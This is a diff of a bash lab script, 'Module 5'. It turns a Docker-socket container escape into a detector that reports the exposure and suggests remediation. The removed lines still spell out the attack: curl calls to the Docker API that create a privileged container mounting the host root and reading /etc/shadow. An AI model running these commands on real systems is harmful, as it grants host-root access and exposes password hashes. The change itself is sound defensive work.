@@ -1,18 +1,20 @@
 ﻿#!/usr/bin/env bash
-# MODULE 5: Container Escape via Docker Socket
-# Target: vuln-web (has /var/run/docker.sock mounted)
-# Technique: Use Docker API over socket to spawn privileged container
+# MODULE 5: Detect Docker socket exposure. Isolated lab only.
+# Does not call mutating Engine API methods.
+set -u
 
-SOCK="/var/run/docker.sock"
+SOCK="${DOCKER_SOCKET:-/var/run/docker.sock}"
 
-echo "[*] Verifying Docker socket access..."
-curl -s --unix-socket "" http://localhost/version
+echo "[*] Checking for Engine Unix socket at ${SOCK}"
+if [[ -S "$SOCK" ]]; then
+  echo "[!] FINDING: socket exists. Mounting it is host-root equivalent."
+  ls -l "$SOCK"
+  echo "[*] Remediation: unmount the socket; use a least-privilege API proxy."
+else
+  echo "No Engine socket at ${SOCK}"
+fi
 
-echo "[*] Listing all containers on host..."
-curl -s --unix-socket "" "http://localhost/containers/json?all=true"
-
-echo "[*] Spawning privileged container with host filesystem..."
-curl -s --unix-socket "" -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"HostConfig":{"Binds":["/:/host:rw"],"Privileged":true}}' \
-  http://localhost/containers/create
+if command -v docker >/dev/null 2>&1; then
+  echo "[*] Host-side inspect of vuln-web mounts (if engine CLI is available)"
+  docker inspect vuln-web --format '{{range .Mounts}}{{println .Source "->" .Destination}}{{end}}' 2>/dev/null || true
+fi
